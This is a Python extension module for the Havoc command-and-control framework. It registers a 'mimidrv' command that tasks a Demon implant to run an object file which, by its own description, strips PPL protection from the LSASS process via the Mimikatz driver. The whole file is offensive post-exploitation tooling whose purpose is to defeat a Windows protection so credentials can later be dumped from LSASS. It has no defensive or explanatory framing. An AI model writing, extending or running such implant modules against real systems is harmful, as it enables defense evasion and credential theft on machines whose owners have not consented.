from havoc import Demon, RegisterCommand, RegisterModule
import re

def mimidrv( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    pid = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True
    elif num_params == 1:
        pid = params[ 0 ]
    elif num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return True

    try:
        pid = int( pid )
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid PID" )
        return True

    packer.adduint32(pid)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable the PPL protection from LSASS" )

    demon.InlineExecute( TaskID, "go", "dist/mimidrv.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( mimidrv, "", "mimidrv", "Disable PPL by interacting with the Mimidrv", 0, "<LSASS_PID>", "1337" )
